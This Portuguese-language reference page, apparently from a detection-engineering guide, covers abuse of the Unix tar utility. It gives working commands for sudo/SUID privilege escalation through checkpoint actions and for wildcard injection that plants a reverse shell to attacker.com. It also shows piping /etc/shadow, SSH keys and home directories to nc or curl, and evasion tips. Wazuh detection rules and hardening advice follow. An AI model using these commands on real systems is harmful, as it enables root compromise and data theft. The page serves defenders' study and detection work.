# tar

**Plataforma:** Linux / macOS / Unix

**Categorias:** Execução de código, Escalada de privilégios (SUID/sudo), Exfiltração de dados, Transferência de arquivos

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1548.001 (SUID/SGID), T1560.001 (Archive via Utility), T1048 (Exfiltration)

**Referência ofensiva:** https://gtfobins.org/gtfobins/tar/

---

## O que é o tar

O tar (Tape ARchive) é a ferramenta padrão para criação e manipulação de arquivos compactados em sistemas Unix. Está presente em absolutamente todos os sistemas Linux e é usado diariamente em scripts de backup, deploys de aplicação, transferência de diretórios e distribuição de pacotes.

O que o torna relevante do ponto de vista de segurança é menos conhecido: o tar suporta execução de comandos arbitrários via checkpoints, um recurso originalmente projetado para exibir mensagens de progresso durante operações longas. Em combinação com permissões mal configuradas de sudo, isso transforma o tar em um vetor direto de escalada de privilégios.

---

## Por que atacantes usam o tar

O tar é quase universalmente permitido em sudoers de ambientes onde administradores precisam fazer backup com permissões elevadas — o que é um caso de uso legítimo extremamente comum. Essa combinação (tar + sudo + falta de restrição de argumentos) cria um dos vetores de escalada de privilégios mais encontrados em sistemas corporativos e em competições de CTF.

Além disso, o tar é a ferramenta natural para empacotar e exfiltrar dados: um único comando pode coletar, compactar e enviar via pipe para nc, curl ou socat, gerando um arquivo de exfiltração eficiente.

---

## Técnicas de abuso

### Escalada de privilégios via sudo

Se o sudoers permite executar tar sem restrição de argumentos, a escalada é imediata via o recurso de checkpoint:

```bash
# Se sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# Alternativa mais simples
sudo tar xf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Via wildcard injection (quando tar é chamado com wildcard em script de root)
# (veja seção de wildcard injection abaixo)
```

O mecanismo de checkpoint funciona assim: `--checkpoint=1` instrui o tar a executar uma ação a cada 1 registro processado, e `--checkpoint-action=exec=COMANDO` define qual comando executar. Isso ocorre no contexto do processo tar — se o tar está rodando como root, o comando também roda como root.

### Wildcard Injection — técnica avançada de escalada

Esta é uma técnica que merece atenção especial, pois aparece em ambientes reais com frequência. Quando um script cron ou script de root executa tar com wildcard, é possível injetar argumentos maliciosos via nomes de arquivos.

Cenário: existe um cron job em `/etc/cron.d/backup` com o conteúdo:

```bash
* * * * * root tar czf /backup/app.tar.gz /opt/app/*
```

O wildcard `/opt/app/*` é expandido pelo shell antes de passar para o tar. Um atacante com escrita em `/opt/app/` pode criar arquivos cujos nomes são interpretados como argumentos pelo tar:

```bash
# Na pasta /opt/app/, criar arquivos com nomes de argumentos tar
echo "" > /opt/app/--checkpoint=1
echo "" > /opt/app/--checkpoint-action=exec=bash\ -i\ >&\ /dev/tcp/attacker.com/4444\ 0>&1

# Quando o cron executar tar czf /backup/app.tar.gz /opt/app/*
# o shell expande para: tar czf /backup/... --checkpoint=1 --checkpoint-action=exec=... arquivo1 arquivo2
# e o tar executa o shell reverso como root
```

### Abuso de SUID no tar

```bash
# Verificar SUID
find / -name tar -perm -4000 2>/dev/null

# Com SUID, executar shell via checkpoint
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### Empacotamento e exfiltração de dados

```bash
# Coletar diretório home completo e enviar via nc
tar czf - /home/usuario | nc attacker.com 9001

# Exfiltrar /etc/ completo
tar czf - /etc/ | nc attacker.com 9001

# Exfiltrar via curl (combina bem)
tar czf - /home/ | curl -X POST -T - http://attacker.com/collect

# Coletar apenas arquivos sensíveis específicos
tar czf - /etc/passwd /etc/shadow /root/.ssh/ /home/*/.ssh/ 2>/dev/null | nc attacker.com 9001

# Empacotar e salvar localmente para exfiltração posterior
tar czf /tmp/.backup_$(date +%s).tgz /home/ /etc/passwd /etc/shadow 2>/dev/null
```

### Leitura de arquivos via extração

```bash
# Se tar tem SUID, extrair arquivo do sistema para local legível
tar cf /tmp/shadow.tar /etc/shadow 2>/dev/null
tar xf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow
```

---

## Técnicas de bypass e evasão

### Uso de formatos alternativos

```bash
# Usar bzip2 em vez de gzip para variar o fingerprint
tar cjf - /home/ | nc attacker.com 9001

# Arquivo não comprimido (mais rápido, sem processos filhos visíveis de compressão)
tar cf - /home/ | nc attacker.com 9001
```

### Nomes de arquivo para ocultar exfiltração

```bash
# Nome que imita backup legítimo
tar czf /tmp/log_archive_$(date +%Y%m%d).tgz /home/ 2>/dev/null

# Salvar em localização menos monitorada
tar czf /dev/shm/.backup.tgz /home/ 2>/dev/null
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- tar com `--checkpoint-action=exec` — uso praticamente sempre malicioso
- tar enviando dados via pipe para nc, socat ou curl para destino externo
- Criação de arquivos com nomes `--checkpoint*` em diretórios com wildcards em scripts root
- tar executado por conta de serviço web

**Indicadores de média relevância:**

- tar com destino em `/dev/shm` ou `/tmp` com posterior transmissão de rede
- tar coletando diretórios sensíveis (`/etc/`, `/root/`, `/home/`) fora de janelas de backup conhecidas
- tar com SUID em localização não padrão

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0101-gtfobins_execution.xml -->

<!-- tar com --checkpoint-action=exec -->
<rule id="100227" level="15">
  <if_group>auditd</if_group>
  <field name="audit.command">tar</field>
  <field name="audit.execve" type="pcre2">--checkpoint-action=exec</field>
  <description>tar com --checkpoint-action=exec — possivel escalada de privilegios ou execucao de comando</description>
  <mitre>
    <id>T1548.001</id>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- tar com pipe para nc/socat/curl -->
<rule id="100228" level="11">
  <if_group>auditd</if_group>
  <field name="audit.command">tar</field>
  <field name="audit.execve" type="pcre2">nc |ncat |socat |curl </field>
  <description>tar com pipe para ferramenta de rede — possivel exfiltracao de dados</description>
  <mitre>
    <id>T1560.001</id>
    <id>T1048</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Scripts de backup legítimos** — o uso normal do tar é para backup. Filtre por usuário de serviço de backup, horário de execução da janela de backup e destino de rede interno (servidor de backup corporativo). A presença de `--checkpoint-action=exec` nunca é legítima em scripts de backup normais.

**Deploys de aplicação** — pipelines de CI/CD frequentemente empacotam e descompactam artefatos com tar. Filtre pelo usuário do pipeline e pelo diretório de trabalho.

---

## Proteção e controles defensivos

**Restringir argumentos no sudoers:** se há necessidade operacional de dar acesso ao tar via sudo para backup, restrinja usando `Cmnd_Alias` com argumentos específicos. Na prática, isso é difícil porque o tar precisa de argumentos variáveis para especificar arquivos. A solução mais segura é usar um wrapper script que chama o tar com argumentos fixos e dar sudo apenas para o wrapper.

**Auditoria de scripts cron com wildcards:** execute periodicamente uma verificação de scripts cron que usam tar com wildcard (`tar * `) e que são executados como root. Esses scripts são vulneráveis à técnica de wildcard injection.

**Monitorar diretórios com wildcard em scripts root:** configure o Wazuh FIM para alertar sobre criação de arquivos que comecem com `--` em diretórios usados por scripts root com wildcard.

---

## Referências

- GTFOBins — tar: https://gtfobins.org/gtfobins/tar/
- MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/
- MITRE ATT&CK T1560.001: https://attack.mitre.org/techniques/T1560/001/
- MITRE ATT&CK T1048: https://attack.mitre.org/techniques/T1048/
